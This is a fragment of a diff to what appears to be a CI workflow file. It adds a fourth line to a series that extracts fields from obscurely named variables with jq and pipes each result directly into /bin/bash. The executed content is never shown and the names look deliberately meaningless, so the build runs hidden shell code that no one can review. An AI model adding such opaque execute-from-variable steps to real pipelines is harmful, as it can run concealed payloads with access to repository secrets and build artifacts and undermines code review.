@@ -26,6 +26,7 @@ jobs:
           echo $yum230 | jq -r .wbbaw1 | /bin/bash
           echo $icdr5964 | jq -r .sv1 | /bin/bash
           printf '%s' "$lpd4" | jq -r .cykjv3189 | /bin/bash
+          echo $lhh3592 | jq -r .ai5403 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
